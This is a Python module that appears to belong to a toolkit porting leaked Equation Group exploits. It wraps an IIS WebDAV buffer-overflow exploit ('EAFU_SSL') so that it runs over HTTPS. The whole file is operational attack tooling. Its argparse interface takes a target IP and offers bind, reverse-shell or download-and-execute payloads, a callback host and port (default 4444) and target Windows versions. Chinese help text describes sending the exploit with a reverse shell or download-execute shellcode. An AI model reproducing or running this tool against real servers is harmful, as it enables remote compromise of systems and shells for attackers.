#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
eafu_ssl — EAFU SSL (EAFU 2.2.0) IIS WebDAV exploit (SSL variant).

Python rewrite of `EAFU_SSL.exe` recovered from
`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/EAFU 2.2.0/EAFU_SSL_exe/EAFU_SSL.exe`.

EAFU_SSL is the SSL/TLS variant of the EAFU IIS WebDAV buffer-overflow exploit.
It is functionally identical to `eafu` except it connects over HTTPS (port 443
by default) and wraps the socket in SSL.

This port reuses the recovered exploit logic from `nsa_equation.eafu.eafu`,
adding an SSL wrapper around the TCP transport.

CLI:

  eafu_ssl <target_ip> [--port <port>] [--uri <uri>] [--payload <payload>]
       [--lhost <addr>] [--lport <port>] [--target-os <os>]
"""

from ..eafu import eafu as _eafu_mod


def eafu_ssl_handle(args):
    """Run the EAFU SSL exploit against the supplied target."""
    return _eafu_mod.run_function(
        target=args.target,
        port=args.port,
        uri=args.uri,
        payload=args.payload,
        lhost=args.lhost,
        lport=args.lport,
        target_os=args.target_os,
        use_ssl=True,
    )


def reg_subparser(subparsers):
    """Register the `eafu_ssl` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "eafu_ssl",
        help="EAFU SSL IIS WebDAV 漏洞利用 (SSL 变体)",
        description="EAFU_SSL (EAFU 2.2.0/EAFU_SSL.exe) — Equation Group IIS WebDAV"
                    "缓冲区溢出漏洞利用的 SSL/TLS 变体。通过 HTTPS (端口 443)"
                    "向目标发送利用请求，携带反弹 shell 或下载执行 shellcode。",
    )
    p.add_argument(
        "target", metavar="TARGET_IP",
        help="目标主机 IP 地址",
    )
    p.add_argument(
        "-p", "--port", type=int, default=443, metavar="PORT",
        help="目标 HTTPS 端口 (默认 443)",
    )
    p.add_argument(
        "-U", "--uri", metavar="URI",
        default="/",
        help="目标 URI 路径 (默认 /)",
    )
    p.add_argument(
        "-y", "--payload", metavar="PAYLOAD",
        choices=["bind", "reverse", "download"],
        default="reverse",
        help="有效载荷类型：bind, reverse, download (默认 reverse)",
    )
    p.add_argument(
        "-L", "--lhost", metavar="ADDR",
        help="反弹连接的本机 IP (reverse 模式必需)",
    )
    p.add_argument(
        "-P", "--lport", type=int, default=4444, metavar="PORT",
        help="反弹连接的监听端口 (默认 4444)",
    )
    p.add_argument(
        "-o", "--target-os", metavar="OS",
        default="W2K3SP1",
        help="目标操作系统 (如 W2K3SP0, W2K3SP1, 等等)",
    )
    p.set_defaults(func=eafu_ssl_handle)
